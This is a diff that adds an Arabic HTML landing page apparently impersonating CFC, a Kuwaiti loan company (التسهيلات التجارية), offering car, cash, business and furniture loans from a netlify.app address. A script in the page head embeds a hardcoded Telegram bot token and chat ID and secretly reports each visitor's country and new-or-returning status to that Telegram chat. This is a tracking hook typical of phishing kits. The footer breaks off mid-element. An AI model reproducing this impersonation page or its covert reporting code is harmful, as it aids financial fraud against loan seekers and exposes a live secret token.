@@ -1,0 +1,1252 @@
+<html lang="ar"><script async="true" src="https://tr.snapchat.com/config/app/f689f723-0d6c-4285-af14-0b1b68b51a03.js?v=3.54.0-2512101929" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://sc-static.net/scevent.min.js"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-E6SPDQB9EB&amp;cx=c&amp;gtm=4e6171"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-P5H6V926"></script><head>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P5H6V926');</script>
+<!-- End Google Tag Manager -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شركة التسهيلات التجارية</title>
+   <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;600;700&amp;display=swap" rel="stylesheet"> 
+    <meta property="og:title" content="اختر نوع القرض المناسب لك - CFC الكويت">
+    <meta property="og:description" content="احصل على قرض نقدي، قرض سيارة أو قرض شركات بكل سهولة وسرعة.">
+    <meta property="og:image" content="https://www.cfc-kw.com/assets/CFC-Logo.jpg">
+    <meta property="og:url" content="https://tashelatkuwait.netlify.app/">
+    <meta property="og:type" content="website">
+    <meta property="og:locale" content="ar_AR">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="اختر نوع القرض المناسب لك - CFC الكويت">
+    <meta name="twitter:description" content="احصل على قرض نقدي، قرض سيارة أو قرض شركات بكل سهولة وسرعة.">
+    <meta name="twitter:image" content="https://www.cfc-kw.com/assets/CFC-Logo.jpg">
+
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;600;700&amp;display=swap" rel="stylesheet">
+   <!-- Telegram notification script -->
+<!-- Telegram notification script -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  // منع التكرار خلال نفس الجلسة
+  if (sessionStorage.getItem("telegramSent")) {
+    console.log("الإشعار سبق وتم إرساله خلال هذه الجلسة.");
+    return;
+  }
+
+  // إعدادات البوت (من قبلك)
+  
+  const telegramToken = "8599584358:AAFo3N5h5TrjujeZGH2SbS8L4EPpjYSaQqg";
+  const chatId = "-5263360636";
+
+  // 👇 هنا اسم الصفحة (عدّله حسب الحاجة)
+  const pageName = " الرئيسية";
+
+  // تحديد حالة الزائر (جديد/قديم)
+  let visitorType = localStorage.getItem("visitorType");
+  let status = "";
+  if (!visitorType) {
+    localStorage.setItem("visitorType", "old");
+    status = "زبون جديد";
+  } else {
+    status = "زبون قديم";
+  }
+
+  // جلب الدولة من API ثم إرسال الرسالة إلى التليجرام
+  fetch('https://api.country.is')
+    .then(response => response.json())
+    .then(data => {
+      const country = data.country || "غير معروف";
+      const message = `حالة الزائر: ${status}\nالدولة: ${country}\nالصفحة: ${pageName}`;
+
+    
+      return fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          disable_notification: false
+        })
+      });
+    })
+    .then(res => res.json())
+    .then(resJson => {
+      if (resJson.ok) {
+        console.log("✅ تم إرسال الإشعار إلى تليجرام بنجاح.");
+        sessionStorage.setItem("telegramSent", "true"); // منع التكرار خلال الجلسة
+      } else {
+        console.log("❌ فشل إرسال الإشعار:", resJson);
+      }
+    })
+    .catch(err => {
+      console.log("⚠️ خطأ أثناء الإرسال أو جلب الدولة:", err);
+    });
+});
+</script><style>undefined</style>
+
+
+   
+   
+   <style>
+        body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important; 
+        padding: auto;
+
+        }
+
+
+
+
+.cards-container {
+    display: flex;
+    justify-content: flex-end; 
+    gap: 20px; 
+    padding: 20px;
+}
+
+.card {
+    width: 200px;
+    border-radius: 15px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+    overflow: hidden;
+    background-color: #fff;
+    text-align: center;
+    transition: transform 0.3s ease;
+}
+
+.card:hover {
+    transform: translateY(-5px);
+}
+
+.card-image {
+    width: 100%;
+    height: auto; 
+    display: block;
+    border-bottom: 1px solid #eee; 
+}
+
+
+.card-text {
+    padding: 10px;
+    font-size: 16px;
+    color: #333;
+}
+
+#text{
+    text-align: right;
+
+}
+
+#imgau ,#imgau1{
+    width: 100%;
+    margin-top: 150px;
+    margin-bottom: 150px;
+}
+
+  html, body {
+    margin: 0;
+    padding: 0;
+  }
+
+  /* الهيدر العام */
+  .header {
+    background-color: #1e40af; /* أزرق داكن */
+    padding: 0;
+    width: 100%;
+    color: white;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.15);
+  }
+
+  /* الحاوية الداخلية */
+  .header-container {
+    max-width: 700px;
+    margin: 0 auto;
+    padding: 12px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    direction: rtl;
+  }
+
+  /* قسم الشعار */
+  .logo-section {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .logo-box {
+    width: 48px;
+    height: 48px;
+    background: rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 1px solid rgba(255, 255, 255, 0.25);
+  }
+
+  .logo-img {
+    width: 38px;
+    filter: brightness(0) invert(1);
+  }
+
+  .logo-text {
+    display: flex;
+    flex-direction: column;
+    text-align: right;
+  }
+
+  .cfc {
+    font-weight: bold;
+    font-size: 1.1rem;
+    letter-spacing: -0.5px;
+  }
+
+  .subtext {
+    font-size: 0.75rem;
+    color: #ffffff;
+  }
+
+  /* زر القائمة */
+  .menu-btn {
+    width: 42px;
+    height: 42px;
+    background: rgba(255, 255, 255, 0.077);
+    backdrop-filter: blur(10px);
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 1px solid rgb(255, 255, 255);
+    cursor: pointer;
+    transition: all 0.3s ease;
+    color: white;
+  }
+
+  .menu-btn:hover {
+    background: rgb(255, 255, 255);
+  }
+
+  /* استجابة للشاشات الصغيرة */
+  @media (max-width: 600px) {
+    .header-container {
+      padding: 10px 14px;
+    }
+    .logo-box {
+      width: 42px;
+      height: 42px;
+    }
+    .logo-img {
+      width: 32px;
+    }
+  }
+
+  /* ===== Header ===== */
+.header {
+  background-color: #1e40af;
+  color: white;
+  width: 100%;
+  padding: 0;
+  margin: 0;
+}
+
+.header-container {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  max-width: 480px;
+  margin: auto;
+  padding: 10px 16px;
+}
+
+.logo-box {
+  width: 45px;
+  height: 45px;
+  background: rgba(255, 255, 255, 0.1);
+  backdrop-filter: blur(8px);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 12px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo-box img {
+  width: 70%;
+  filter: brightness(0) invert(1);
+}
+
+.logo-text {
+  display: flex;
+  flex-direction: column;
+  text-align: right;
+  margin-right: 10px;
+}
+
+.brand {
+  font-weight: bold;
+  font-size: 18px;
+}
+
+.sub {
+  font-size: 12px;
+  color: #c7d2fe;
+}
+
+.menu-btn {
+  background: rgba(255, 255, 255, 0.1);
+  backdrop-filter: blur(6px);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  width: 40px;
+  height: 40px;
+  border-radius: 8px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: white;
+  cursor: pointer;
+  transition: background 0.3s;
+}
+
+.menu-btn:hover {
+  background: rgba(255, 255, 255, 0.2);
+}
+
+/* ===== Slider ===== */
+.slider {
+  position: relative;
+  width: 100%;
+  max-width: 480px;
+  margin: 10px auto;
+  overflow: hidden;
+  border-radius: 8px;
+}
+
+.slides {
+  position: relative;
+  height: 200px;
+}
+
+.slide {
+  position: absolute;
+  inset: 0;
+  background-size: cover;
+  background-position: center;
+  opacity: 0;
+  transform: translateX(100%);
+  transition: all 0.7s ease;
+}
+
+.slide.active {
+  opacity: 1;
+  transform: translateX(0);
+}
+
+.arrow {
+  position: absolute;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 36px;
+  height: 36px;
+  background: rgba(255, 255, 255, 0.2);
+  border: none;
+  border-radius: 50%;
+  color: white;
+  cursor: pointer;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  transition: background 0.3s;
+}
+
+.arrow:hover {
+  background: rgba(255, 255, 255, 0.3);
+}
+
+.arrow.left {
+  left: 10px;
+}
+
+.arrow.right {
+  right: 10px;
+}
+
+.dots {
+  display: flex;
+  justify-content: center;
+  gap: 6px;
+  padding: 8px 0 10px;
+}
+
+.dots button {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  border: none;
+  background: rgba(255, 255, 255, 0.4);
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.dots button.active {
+  background: white;
+  width: 20px;
+  border-radius: 6px;
+}
+
+img, .menu-btn, .arrow {
+  visibility: visible !important;
+  opacity: 1 !important;
+  transition: none !important;
+}
+
+.slide {
+  background-color: #f3f4f6; 
+}
+
+
+.text-card-foreground {
+  background-color: #ffffff;
+  box-shadow: 0 10px 15px rgba(0,0,0,0.1);
+  border-radius: 1rem;
+  overflow: hidden;
+  border: 0.2px solid #00000015; 
+}
+
+.p-4 {
+  padding: 1rem;
+}
+
+.grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 1rem;
+  text-align: center;
+}
+
+.card-item {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 0.25rem;
+  /* لا توجد حواف هنا */
+}
+
+.border-x {
+  border-left: 1px solid #e5e7eb;
+  border-right: 1px solid #e5e7eb;
+}
+
+.icon-text {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.25rem;
+}
+
+.icon {
+  width: 1rem;
+  height: 1rem;
+  stroke-width: 2;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+}
+
+.trending-up {
+  color: #16a34a; /* أخضر */
+}
+
+.circle-check {
+  color: #2563eb; /* أزرق */
+}
+
+.sparkles {
+  color: #facc15; /* أصفر */
+}
+
+.value {
+  font-size: 1.5rem;
+  font-weight: bold;
+  color: #111827;
+}
+
+.label {
+  font-size: 0.75rem;
+  color: #6b7280;
+}
+.loan-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 1rem;
+  padding: 1rem;
+}
+
+.loan-card {
+  background: #ffffff;
+  border-radius: 1rem;
+  box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+  text-decoration: none;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 1.5rem;
+  transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.loan-card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 10px 15px rgba(0,0,0,0.15);
+}
+
+.card-icon {
+  width: 4rem;
+  height: 4rem;
+  border-radius: 0.75rem;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 1rem;
+}
+
+.bg-blue { background: linear-gradient(to bottom right, #3b82f6, #2563eb); color: #fff; }
+.bg-cyan { background: linear-gradient(to bottom right, #06b6d4, #0ea5e9); color: #fff; }
+.bg-green { background: linear-gradient(to bottom right, #10b981, #047857); color: #fff; }
+.bg-purple { background: linear-gradient(to bottom right, #a855f7, #db2777); color: #fff; }
+
+.card-text {
+  text-align: center;
+}
+
+.card-title {
+  font-weight: bold;
+  font-size: 1rem;
+  color: #111827;
+  margin-bottom: 0.25rem;
+}
+
+.card-desc {
+  font-size: 0.75rem;
+  color: #6b7280;
+  line-height: 1.25rem;
+}
+
+/* شبكة البوكسات */
+section .grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 1rem;
+  padding: 1rem;
+}
+
+/* شكل البوكس */
+section .grid > div {
+  border-radius: 14px;
+  padding: 1.5rem 1rem;
+  text-align: center;
+  background-color: #f9fafb;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+}
+
+/* التأثير عند التحريك */
+section .grid > div:hover {
+  transform: translateY(-4px);
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+}
+
+/* الألوان المخصصة لكل بوكس */
+section .grid .green-box {
+  background-color: #eafcf1;
+}
+section .grid .blue-box {
+  background-color: #edf6ff;
+}
+section .grid .purple-box {
+  background-color: #f5eeff;
+}
+section .grid .yellow-box {
+  background-color: #fffbea;
+}
+
+/* الأيقونة */
+section .grid svg {
+  width: 28px;
+  height: 28px;
+  margin-bottom: 0.6rem;
+}
+
+/* العنوان */
+section .grid h3 {
+  font-size: 1rem;
+  font-weight: 600;
+  color: #222;
+  margin-bottom: 0.4rem;
+}
+
+/* النص */
+section .grid p {
+  font-size: 0.85rem;
+  color: #666;
+  line-height: 1.4rem;
+}
+
+/* للهواتف */
+@media (max-width: 640px) {
+  section .grid {
+    grid-template-columns: 1fr 1fr;
+    gap: 0.8rem;
+  }
+
+  section .grid > div {
+    padding: 1.2rem 0.6rem;
+  }
+
+  section .grid h3 {
+    font-size: 0.9rem;
+  }
+
+  section .grid p {
+    font-size: 0.75rem;
+  }
+}
+
+
+/* العنوان الرئيسي للقسم */
+section .section-header {
+  text-align: center;
+  margin-bottom: 1.5rem;
+  padding: 0 1rem;
+}
+
+/* العنوان */
+section .section-header h2 {
+  font-size: 1.4rem;
+  font-weight: 700;
+  color: #1e3a8a; /* أزرق داكن مثل شعار CFC */
+  margin-bottom: 0.5rem;
+  position: relative;
+  display: inline-block;
+}
+
+/* خط ديكوري تحت العنوان */
+section .section-header h2::after {
+  content: "";
+  position: absolute;
+  bottom: -6px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 40px;
+  height: 3px;
+  border-radius: 4px;
+  background: linear-gradient(to right, #1d4ed8, #3b82f6);
+}
+
+/* النص */
+section .section-header p {
+  font-size: 0.9rem;
+  color: #555;
+  line-height: 1.6rem;
+  max-width: 320px;
+  margin: 0 auto;
+}
+
+/* الهواتف */
+@media (max-width: 640px) {
+  section .section-header h2 {
+    font-size: 1.2rem;
+  }
+
+  section .section-header p {
+    font-size: 0.85rem;
+    line-height: 1.4rem;
+  }
+}
+
+
+/* الخلفية العامة */
+.footer {
+  background: linear-gradient(to bottom, #0f172a, #020617);
+  color: #fff;
+  text-align: center;
+  padding: 3rem 1rem 1.5rem;
+  font-family: "Noto Sans Arabic", sans-serif;
+}
+
+/* الحاوية */
+.footer-container {
+  max-width: 400px;
+  margin: auto;
+}
+
+/* الشعار */
+.footer-logo {
+  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  padding-bottom: 1.5rem;
+  margin-bottom: 1.5rem;
+}
+
+.footer-logo .logo-box {
+  width: 70px;
+  height: 70px;
+  background: rgba(255, 255, 255, 0.08);
+  backdrop-filter: blur(10px);
+  border-radius: 18px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 0.8rem;
+}
+
+.footer-logo img {
+  width: 48px;
+  filter: brightness(0) invert(1);
+}
+
+.footer-logo h3 {
+  font-size: 1.2rem;
+  font-weight: 700;
+}
+
+.footer-logo p {
+  font-size: 0.85rem;
+  color: #9ca3af;
+}
+
+/* الروابط */
+.footer-links {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 2rem;
+  text-align: right;
+  margin-bottom: 2rem;
+}
+
+.links-section h4 {
+  font-weight: 700;
+  margin-bottom: 1rem;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  justify-content: flex-end;
+}
+
+.links-section .dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: inline-block;
+}
+
+.dot.blue {
+  background: #3b82f6;
+}
+.dot.green {
+  background: #10b981;
+}
+
+.links-section ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+
+.links-section li {
+  color: #9ca3af;
+  font-size: 0.85rem;
+  margin-bottom: 0.5rem;
+  transition: 0.3s;
+  cursor: pointer;
+}
+
+.links-section li:hover {
+  color: #fff;
+  transform: translateX(-4px);
+}
+
+/* السوشيال */
+.footer-social h4,
+.footer-apps h4 {
+  font-weight: 700;
+  margin-bottom: 1rem;
+}
+
+.social-buttons,
+.app-buttons {
+  display: flex;
+  justify-content: center;
+  gap: 0.6rem;
+  flex-wrap: wrap;
+}
+
+/* أزرار السوشيال */
+.social-buttons button {
+  width: 44px;
+  height: 44px;
+  border: none;
+  border-radius: 12px;
+  color: #fff;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.ig {
+  background: linear-gradient(to bottom right, #ec4899, #8b5cf6);
+}
+.fb {
+  background: linear-gradient(to bottom right, #3b82f6, #1e40af);
+}
+.x {
+  background: linear-gradient(to bottom right, #4b5563, #111827);
+}
+.yt {
+  background: linear-gradient(to bottom right, #ef4444, #b91c1c);
+}
+.li {
+  background: linear-gradient(to bottom right, #2563eb, #1e3a8a);
+}
+
+.social-buttons button:hover {
+  transform: scale(1.1) translateY(-3px);
+}
+
+/* أزرار التطبيق */
+.app-buttons button {
+  background: #fff;
+  color: #111;
+  border: none;
+  border-radius: 12px;
+  padding: 0.6rem 1rem;
+  font-size: 0.85rem;
+  font-weight: 600;
+  cursor: pointer;
+  box-shadow: 0 4px 8px rgba(255, 255, 255, 0.1);
+  transition: 0.3s;
+}
+
+.app-buttons button:hover {
+  background: #f3f4f6;
+  transform: scale(1.05);
+}
+
+/* تذييل الحقوق */
+.footer-bottom {
+  border-top: 1px solid rgba(255, 255, 255, 0.1);
+  margin-top: 2rem;
+  padding-top: 1.5rem;
+}
+
+.footer-bottom p {
+  font-size: 0.75rem;
+  color: #9ca3af;
+  line-height: 1.4rem;
+}
+
+/* الهواتف */
+@media (max-width: 640px) {
+  .footer-links {
+    grid-template-columns: 1fr 1fr;
+    gap: 1.5rem;
+  }
+}
+
+/* إعدادات أولية */
+
+h2{
+  text-align: right;
+  margin-right: 20px;
+  font-size: 22px;
+
+}
+
+
+    </style>
+<script>
+window.addEventListener('load', () => {
+  document.querySelectorAll('img, .menu-btn, .arrow').forEach(el => {
+    el.style.visibility = 'visible';
+    el.style.opacity = '1';
+  });
+});
+</script><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa"></head>
+
+
+<body>
+<header class="header">
+  <div class="header-container">
+    <!-- القسم الأيمن: الشعار والنص -->
+    <div class="logo-section">
+      <div class="logo-box">
+        <img src="./assets/img/next.svg" alt="CFC Logo" class="logo-img" style="visibility: visible; opacity: 1;">
+      </div>
+      <div class="logo-text">
+        <span class="cfc">CFC</span>
+        <span class="subtext">التسهيلات التجارية</span>
+      </div>
+    </div>
+
+    <!-- القسم الأيسر: الزر -->
+    <button id="botn" class="menu-btn" style="visibility: visible; opacity: 1;">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu w-5 h-5" aria-hidden="true" style="transform: scaleX(-1);">
+        <path d="M4 12h16"></path>
+        <path d="M4 18h16"></path>
+        <path d="M4 6h16"></path>
+      </svg>
+    </button>
+
+    
+  </div>
+</header>
+
+
+
+
+
+<section class="slider">
+  <div class="slides">
+<div class="slide" style="background-image: url('./assets/img/hdfgjuyh.jpeg');"></div>
+    <div class="slide" style="background-image: url('./assets/img/CFC-Logo.jpg');"></div>
+    <div class="slide" style="background-image: url('./assets/img/jfguhyj.jpeg');"></div>
+    <div class="slide active" style="background-image: url('./assets/img/hdfgjuyh.jpeg');"></div>
+  </div>
+
+  <button class="arrow left" aria-label="السابق" style="visibility: visible; opacity: 1;">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="m15 18-6-6 6-6"></path>
+    </svg>
+  </button>
+
+  <button class="arrow right" aria-label="التالي" style="visibility: visible; opacity: 1;">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="m9 18 6-6-6-6"></path>
+    </svg>
+  </button>
+
+  <div class="dots"><button class=""></button><button class=""></button><button class=""></button><button class="active"></button></div>
+</section>
+
+
+<div class="text-card-foreground">
+  <div class="p-4">
+    <div class="grid grid-cols-3 gap-4 text-center">
+
+      <!-- سنة خبرة -->
+      <div class="card-item">
+        <div class="icon-text">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon trending-up" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+            <path d="M16 7h6v6"></path>
+            <path d="m22 7-8.5 8.5-5-5L2 17"></path>
+          </svg>
+          <p class="value">٤٢</p>
+        </div>
+        <p class="label">سنة خبرة</p>
+      </div>
+
+      <!-- رضا العملاء -->
+      <div class="card-item border-x">
+        <div class="icon-text">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon circle-check" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+            <circle cx="12" cy="12" r="10"></circle>
+            <path d="m9 12 2 2 4-4"></path>
+          </svg>
+          <p class="value">٩٨٪</p>
+        </div>
+        <p class="label">رضا العملاء</p>
+      </div>
+
+      <!-- دعم فوري -->
+      <div class="card-item">
+        <div class="icon-text">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon sparkles" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+            <path d="M11.017 2.814a1 1 0 0 1 1.966 0l1.051 5.558a2 2 0 0 0 1.594 1.594l5.558 1.051a1 1 0 0 1 0 1.966l-5.558 1.051a2 2 0 0 0-1.594 1.594l-1.051 5.558a1 1 0 0 1-1.966 0l-1.051-5.558a2 2 0 0 0-1.594-1.594l-5.558-1.051a1 1 0 0 1 0-1.966l5.558-1.051a2 2 0 0 0 1.594-1.594z"></path>
+            <path d="M20 2v4"></path>
+            <path d="M22 4h-4"></path>
+            <circle cx="4" cy="20" r="2"></circle>
+          </svg>
+          <p class="value">٢٤/٧</p>
+        </div>
+        <p class="label">دعم فوري</p>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+
+
+
+  <h2> <br>اختر نوع القرض المناسب لك  <br> </h2>
+
+<div class="loan-grid">
+
+
+
+
+  <a class="loan-card" href="./cashcar">
+    <div class="card-icon bg-cyan">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon car" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+        <path d="M19 17h2c.6 0 1-.4 1-1v-3c0-.9-.7-1.7-1.5-1.9C18.7 10.6 16 10 16 10s-1.3-1.4-2.2-2.3c-.5-.4-1.1-.7-1.8-.7H5c-.6 0-1.1.4-1.4.9l-1.4 2.9A3.7 3.7 0 0 0 2 12v4c0 .6.4 1 1 1h2"></path>
+        <circle cx="7" cy="17" r="2"></circle>
+        <path d="M9 17h6"></path>
+        <circle cx="17" cy="17" r="2"></circle>
+      </svg>
+    </div>
+    <div class="card-text">
+      <p class="card-title">قرض سيارة</p>
+      <p class="card-desc">احصل على سيارة أحلامك بسهولة</p>
+    </div>
+  </a>
+  <!-- قرض نقدي -->
+  <a class="loan-card" href="./cash1">
+    <div class="card-icon bg-blue">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon hand-coins" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+        <path d="M11 15h2a2 2 0 1 0 0-4h-3c-.6 0-1.1.2-1.4.6L3 17"></path>
+        <path d="m7 21 1.6-1.4c.3-.4.8-.6 1.4-.6h4c1.1 0 2.1-.4 2.8-1.2l4.6-4.4a2 2 0 0 0-2.75-2.91l-4.2 3.9"></path>
+        <path d="m2 16 6 6"></path>
+        <circle cx="16" cy="9" r="2.9"></circle>
+        <circle cx="6" cy="5" r="3"></circle>
+      </svg>
+    </div>
+    <div class="card-text">
+      <p class="card-title">قرض نقدي</p>
+      <p class="card-desc">تمويل فوري ومرن لجميع احتياجاتك</p>
+    </div>
+  </a>
+
+
+
+
+
+
+
+    <!-- قرض سكن -->
+  <a class="loan-card" href="./cash1">
+    <div class="card-icon bg-green">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon house" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+        <path d="M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8"></path>
+        <path d="M3 10a2 2 0 0 1 .709-1.528l7-5.999a2 2 0 0 1 2.582 0l7 5.999A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+      </svg>
+    </div>
+    <div class="card-text">
+      <p class="card-title">قرض شركات</p>
+      <p class="card-desc">امتلك قرض الشركات اليوم</p>
+    </div>
+  </a>
+
+
+    <!-- قرض أثاث -->
+  <a class="loan-card" href="./cashhom">
+    <div class="card-icon bg-purple">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon sofa" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+        <path d="M20 9V6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v3"></path>
+        <path d="M2 16a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-5a2 2 0 0 0-4 0v1.5a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5V11a2 2 0 0 0-4 0z"></path>
+        <path d="M4 18v2"></path>
+        <path d="M20 18v2"></path>
+        <path d="M12 4v9"></path>
+      </svg>
+    </div>
+    <div class="card-text">
+      <p class="card-title">قرض أثاث</p>
+      <p class="card-desc">جهز منزلك بأفضل الأثاث</p>
+    </div>
+  </a>
+
+</div>
+
+
+
+<section>
+
+<section dir="rtl">
+  <div class="section-header">
+    <h2>لماذا CFC؟</h2>
+    <p>
+      مرحباً بكم في CFC، حيث رضاكم هو أولويتنا. اكتشفوا لماذا يعتبر اختيار CFC هو أفضل قرار لاحتياجاتكم المالية.
+    </p>
+  </div>
+
+  <div class="grid">
+    <!-- هنا ضع البوكسات الأربعة -->
+  </div>
+</section>
+
+
+
+
+
+  <div class="grid">
+    <div class="green-box">
+      <svg fill="#1ba45d" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 22a10 10 0 1 1 0-20 10 10 0 0 1 0 20zm.5-15h-1v6l4.5 2.7.5-.8-4-2.4V7z"></path></svg>
+      <h3>سرعة في الخدمة</h3>
+      <p>موافقة فورية خلال دقائق</p>
+    </div>
+
+    <div class="blue-box">
+      <svg fill="#2b6cb0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1.75a10.25 10.25 0 1 0 10.25 10.25A10.26 10.26 0 0 0 12 1.75zm0 18.5a8.25 8.25 0 1 1 8.25-8.25A8.26 8.26 0 0 1 12 20.25z"></path><path d="M10.5 13.5 8.75 11.75l-.71.71 2.46 2.46 5-5-.71-.71-4.29 4.29z"></path></svg>
+      <h3>أمان وثقة</h3>
+      <p>حماية كاملة لبياناتكم المالية</p>
+    </div>
+
+    <div class="purple-box">
+      <svg fill="#805ad5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17.27 18.18 21 16.54 13.97 22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path></svg>
+      <h3>خبرة ٤٢ عامًا</h3>
+      <p>ريادة وثقة في السوق</p>
+    </div>
+
+    <div class="yellow-box">
+      <svg fill="#d69e2e" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17.27 18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path></svg>
+      <h3>خدمة متميزة</h3>
+      <p>دعم احترافي على مدار الساعة</p>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="footer-container">
+    <!-- شعار الشركة -->
+    <div class="footer-logo">
+      <div class="logo-box">
+        <img src="./assets/img/next.svg" alt="CFC Logo" style="visibility: visible; opacity: 1;">
+      </div>
+      <h3>شركة التسهيلات التجارية</h3>
+      <p>شريكك الموثوق في التمويل منذ ١٩٨٣</p>
+    </div>
+
+    <!-- الروابط -->
+    <div class="footer-links">
+      <div class="links-section">
+        <h4><span class="dot blue"></span> من نحن</h4>
+        <ul>
+          <li>التاريخ</li>
+          <li>الرؤية والرسالة</li>
+          <li>مجلس الإدارة</li>
+          <li>فريق الإدارة</li>
+          <li>الحوكمة المؤسسية</li>
+        </ul>
+      </div>
+
+      <div class="links-section">
+        <h4><span class="dot green"></span> خدماتنا</h4>
+        <ul>
+          <li>قرض نقدي</li>
+          <li>قرض سيارة</li>
+          <li>قرض سكن</li>
+          <li>قرض بحري</li>
+          <li>قرض أثاث</li>
+          <li>قرض تجاري</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- السوشيال -->
+    <div class="footer-social">
+      <h4>تابعنا على</h4>
+      <div class="social-buttons">
+        <button class="ig">IG</button>
+        <button class="fb">FB</button>
+        <button class="x">X</button>
+        <button class="yt">YT</button>
+        <button class="li">LI</button>
+      </div>
+    </div>
+
+
+
+    <!-- الحقوق -->
+    <div class="footer-bottom">
